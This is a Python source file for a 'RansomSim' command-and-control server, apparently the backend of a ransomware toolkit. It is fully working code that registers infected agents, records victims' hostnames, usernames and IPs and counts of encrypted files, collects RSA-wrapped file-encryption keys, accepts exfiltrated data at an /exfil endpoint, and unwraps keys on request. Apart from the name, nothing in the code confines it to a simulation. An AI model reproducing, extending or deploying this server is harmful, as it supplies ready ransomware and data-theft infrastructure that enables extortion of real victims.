#!/usr/bin/env python3
"""
RansomSim C2 Server
Handles agent beaconing, key exfiltration, tasking, and decryption.
"""
import os
import json
import base64
import socket
import threading
import datetime
import http.server
import urllib.parse
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

HOST = "0.0.0.0"
PORT = 8443
KEYS_DIR = "keys"
DATA_DIR = "c2_data"
PRIVATE_KEY_PATH = os.path.join(KEYS_DIR, "private.pem")

os.makedirs(DATA_DIR, exist_ok=True)

# Global state
agents = {}       # agent_id -> {last_seen, system_info, encrypted_keys, status}
agent_lock = threading.Lock()

def load_private_key():
    with open(PRIVATE_KEY_PATH, "rb") as f:
        return serialization.load_pem_private_key(f.read(), password=None)

PRIVATE_KEY = load_private_key()

def decrypt_rsa(ciphertext_b64):
    """Decrypt base64-encoded RSA ciphertext using private key."""
    ciphertext = base64.b64decode(ciphertext_b64)
    plaintext = PRIVATE_KEY.decrypt(
        ciphertext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )
    return plaintext

def decrypt_aes_key(encrypted_aes_key_b64):
    """Decrypt the RSA-wrapped AES key."""
    return decrypt_rsa(encrypted_aes_key_b64)

def decrypt_file(encrypted_data, aes_key, nonce):
    """Decrypt file data using AES-CTR with given key and nonce."""
    cipher = Cipher(algorithms.AES(aes_key), modes.CTR(nonce))
    decryptor = cipher.decryptor()
    return decryptor.update(encrypted_data) + decryptor.finalize()

class C2Handler(http.server.BaseHTTPRequestHandler):
    """HTTP request handler for C2 operations."""

    def log_message(self, format, *args):
        pass  # Suppress default HTTP server logs

    def _send_json(self, code, data):
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path

        if path == "/":
            self._send_json(200, {
                "status": "ok",
                "server": "RansomSim C2",
                "agents_online": len(agents)
            })
        elif path == "/admin/agents":
            with agent_lock:
                agent_list = []
                for aid, info in agents.items():
                    agent_list.append({
                        "id": aid,
                        "hostname": info.get("hostname", "?"),
                        "username": info.get("username", "?"),
                        "ip": info.get("ip", "?"),
                        "last_seen": info.get("last_seen", "?"),
                        "file_count": info.get("file_count", 0),
                        "status": info.get("status", "unknown"),
                    })
            self._send_json(200, {"agents": agent_list})
        elif path.startswith("/admin/decrypt/"):
            # GET /admin/decrypt/<agent_id>
            agent_id = path.split("/")[-1]
            with agent_lock:
                info = agents.get(agent_id)
            if not info:
                self._send_json(404, {"error": "Agent not found"})
                return
            self._send_json(200, {
                "agent_id": agent_id,
                "system_info": info.get("system_info", {}),
                "status": info.get("status"),
                "has_keys": info.get("encrypted_keys") is not None,
            })
        elif path.startswith("/admin/restore/"):
            # GET /admin/restore/<agent_id>
            # Triggers full decryption simulation
            agent_id = path.split("/")[-1]
            with agent_lock:
                info = agents.get(agent_id)
            if not info or not info.get("encrypted_keys"):
                self._send_json(404, {"error": "No keys available for this agent"})
                return

            try:
                agent_key_b64 = info["encrypted_keys"]
                agent_aes_key = decrypt_aes_key(agent_key_b64)
                agent_aes_key_hex = agent_aes_key.hex()

                result = {
                    "status": "decryption_key_available",
                    "agent_id": agent_id,
                    "aes_key_hex": agent_aes_key_hex,
                    "note": "Use this AES key with the corresponding nonce per file to decrypt."
                }
                self._send_json(200, result)

                # Log the decryption event
                log_path = os.path.join(
                    DATA_DIR, f"{agent_id}_decryption_key.txt"
                )
                with open(log_path, "w") as f:
                    f.write(f"Agent: {agent_id}\n")
                    f.write(f"AES Key (hex): {agent_aes_key_hex}\n")
                    f.write(f"Timestamp: {datetime.datetime.now().isoformat()}\n")
                print(f"[!] Decryption key for {agent_id} extracted and saved.")
            except Exception as e:
                self._send_json(500, {"error": f"Decryption failed: {str(e)}"})
        else:
            self._send_json(404, {"error": "not found"})

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length)

        try:
            data = json.loads(body.decode())
        except (json.JSONDecodeError, UnicodeDecodeError):
            self._send_json(400, {"error": "invalid json"})
            return

        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path

        if path == "/beacon":
            # Agent registration / heartbeat
            agent_id = data.get("agent_id", "unknown")
            system_info = data.get("system_info", {})
            encrypted_keys = data.get("encrypted_keys")
            file_count = data.get("file_count", 0)
            status = data.get("status", "active")

            now = datetime.datetime.now().isoformat()
            with agent_lock:
                agents[agent_id] = {
                    "last_seen": now,
                    "hostname": system_info.get("hostname", ""),
                    "username": system_info.get("username", ""),
                    "ip": system_info.get("ip", ""),
                    "system_info": system_info,
                    "encrypted_keys": encrypted_keys,
                    "file_count": file_count,
                    "status": status,
                }

            print(f"\n[+] Beacon received from agent: {agent_id}")
            print(f"    Hostname: {system_info.get('hostname', '?')}")
            print(f"    Username: {system_info.get('username', '?')}")
            print(f"    IP: {system_info.get('ip', '?')}")
            print(f"    Files encrypted: {file_count}")
            print(f"    Keys received: {'Yes' if encrypted_keys else 'No'}")
            print(f"    Status: {status}")
            print(f"    Time: {now}")

            # Save agent data to disk
            agent_file = os.path.join(DATA_DIR, f"{agent_id}.json")
            with open(agent_file, "w") as f:
                json.dump(agents[agent_id], f, indent=2)

            # Respond with any pending tasks
            self._send_json(200, {
                "status": "ack",
                "tasks": []
            })

        elif path == "/exfil":
            # Data exfiltration endpoint
            agent_id = data.get("agent_id", "unknown")
            exfil_data = data.get("data", "")

            exfil_path = os.path.join(DATA_DIR, f"{agent_id}_exfil.txt")
            with open(exfil_path, "a") as f:
                f.write(f"[{datetime.datetime.now().isoformat()}] {exfil_data}\n")

            print(f"[+] Exfil data received from {agent_id}")
            self._send_json(200, {"status": "received"})

        else:
            self._send_json(404, {"error": "not found"})


def run_server():
    server = http.server.HTTPServer((HOST, PORT), C2Handler)
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║                   RansomSim C2 Server                        ║
╠══════════════════════════════════════════════════════════════╣
║  Listening on:   {HOST}:{PORT}                                   ║
║  Private Key:    {PRIVATE_KEY_PATH}                                ║
║  Data Dir:       {DATA_DIR}/                                    ║
╠══════════════════════════════════════════════════════════════╣
║  Endpoints:                                                   ║
║    GET  /                  - Server status                    ║
║    GET  /admin/agents     - List all agents                   ║
║    GET  /admin/decrypt/X  - View agent decryption status      ║
║    GET  /admin/restore/X  - Extract AES key for agent X       ║
║    POST /beacon           - Agent beacon (implant -> C2)      ║
║    POST /exfil            - Data exfiltration                 ║
╚══════════════════════════════════════════════════════════════╝
    """)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server shutting down.")
        server.server_close()

if __name__ == "__main__":
    run_server()
